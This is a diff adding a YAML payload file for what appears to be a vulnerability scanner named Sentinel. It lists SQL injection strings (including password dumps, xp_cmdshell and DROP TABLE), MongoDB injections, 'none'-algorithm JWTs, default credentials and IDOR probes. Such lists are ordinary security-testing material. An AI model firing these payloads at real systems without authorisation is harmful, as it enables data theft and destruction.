@@ -1,0 +1,174 @@
+# Attack Patterns for Sentinel
+# This file contains payloads and patterns for various attack types
+
+sql_injection:
+  # Basic SQL injection payloads
+  basic:
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "' OR '1'='1' /*"
+    - "1' OR '1'='1"
+    - "1 OR 1=1"
+    - "' OR ''='"
+    - "'' OR ''=''"
+  
+  # Time-based blind SQL injection
+  time_based:
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "'; SELECT SLEEP(5)--"
+    - "1; SELECT SLEEP(5)--"
+    - "'; BENCHMARK(5000000,SHA1('test'))--"
+    - "1'; SELECT pg_sleep(5)--"
+  
+  # Error-based SQL injection
+  error_based:
+    - "'"
+    - "''"
+    - "\""
+    - "\"\""
+    - "\\"
+    - "'%"
+    - "%%"
+  
+  # UNION-based SQL injection
+  union_based:
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL, NULL--"
+    - "' UNION SELECT NULL, NULL, NULL--"
+    - "1' UNION SELECT username, password FROM users--"
+    - "' UNION ALL SELECT NULL,table_name FROM information_schema.tables--"
+  
+  # Database-specific payloads
+  mysql:
+    - "' OR 1=1#"
+    - "' OR 'x'='x"
+    - "/*!50000OR*/1=1"
+    - "' INTO OUTFILE '/tmp/data.txt'--"
+  
+  postgresql:
+    - "' OR 1=1--"
+    - "'; SELECT * FROM pg_catalog.pg_tables--"
+    - "'; COPY users TO '/tmp/users.txt'--"
+  
+  mssql:
+    - "' OR 1=1--"
+    - "'; EXEC xp_cmdshell('dir')--"
+    - "'; DROP TABLE users--"
+  
+  sqlite:
+    - "' OR 1=1--"
+    - "'; ATTACH DATABASE '/tmp/data.db' AS data--"
+    - "' UNION SELECT sqlite_version()--"
+
+nosql_injection:
+  # MongoDB injection patterns
+  mongodb:
+    - '{"$gt": ""}'
+    - '{"$gt": null}'
+    - '{"$ne": ""}'
+    - '{"$ne": null}'
+    - '{"$where": "1==1"}'
+    - '{"$where": "this.password == this.password"}'
+    - '{"$or": [{"username": "admin"}, {"username": "user"}]}'
+    - '{"$regex": ".*"}'
+  
+  # JSON-based injection
+  json_based:
+    - '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+    - '{"username": "admin", "password": {"$gt": ""}}'
+    - '{"$where": "return true"}'
+    - '{"$where": "this.username == \'admin\'"}'
+
+auth_bypass:
+  # Tokens to try
+  invalid_tokens:
+    - ""
+    - "null"
+    - "undefined"
+    - "invalid"
+    - "Bearer invalid"
+    - "Bearer abc123"
+    - "Bearer token"
+    - "Basic admin:admin"
+  
+  # JWT manipulation
+  jwt_none_algorithm:
+    - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+    - "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+  
+  # Common test credentials
+  test_credentials:
+    - "admin:admin"
+    - "admin:password"
+    - "test:test"
+    - "guest:guest"
+    - "root:root"
+
+idor:
+  # ID patterns to try
+  numeric_ids:
+    - "1"
+    - "2"
+    - "0"
+    - "-1"
+    - "999999"
+    - "1000000"
+    - "2147483647"  # Max 32-bit int
+  
+  # UUID patterns
+  uuid_patterns:
+    - "00000000-0000-0000-0000-000000000000"
+    - "00000000-0000-0000-0000-000000000001"
+  
+  # MongoDB ObjectId patterns
+  mongodb_ids:
+    - "507f1f77bcf86cd799439011"
+    - "507f191e810c19729de860ea"
+  
+  # Common resource names
+  resource_names:
+    - "admin"
+    - "test"
+    - "user"
+    - "guest"
+    - "root"
+    - "default"
+    - "public"
+
+response_patterns:
+  # SQL error patterns
+  sql_errors:
+    - "sql syntax"
+    - "mysql_fetch"
+    - "ORA-"
+    - "PLS-"
+    - "Unclosed quotation mark"
+    - "quoted string not properly terminated"
+    - "pg_query()"
+    - "Warning: pg_"
+    - "valid MySQL result"
+    - "mysql_numrows()"
+    - "mysql_fetch_array()"
+    - "SQLSTATE["
+    - "SQLite3::query"
+    - "near \""
+    - "syntax error"
+    - "unrecognized token"
+  
+  # Successful auth bypass indicators
+  auth_bypass_success:
+    - "welcome"
+    - "dashboard"
+    - "admin"
+    - "profile"
+    - "settings"
+  
+  # Sensitive data patterns
+  sensitive_data:
+    - "password"
+    - "secret"
+    - "token"
+    - "api_key"
+    - "credit_card"
+    - "ssn"
+    - "email"
